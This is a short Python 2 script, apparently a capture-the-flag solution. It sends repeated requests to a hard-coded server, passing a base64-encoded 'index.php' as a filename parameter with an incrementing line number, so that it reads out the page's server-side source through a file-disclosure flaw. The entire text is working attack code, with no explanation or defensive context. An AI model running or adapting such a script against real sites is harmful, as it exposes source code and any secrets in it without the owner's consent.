#! /usr/bin/env python2
#  -*- coding: utf-8 -*-
#  author:boo

import requests
s=requests.Session()
url='http://120.24.86.145:8002/web11/index.php'
for i in range(1,20):
    payload={'line':str(i),'filename':'aW5kZXgucGhw'}
    #print (payload)
    #a=s.get(url,params=payload).content
    a=s.get(url,params=payload)
    #content=str(a)
    #print (a.content)
    print(a.text)
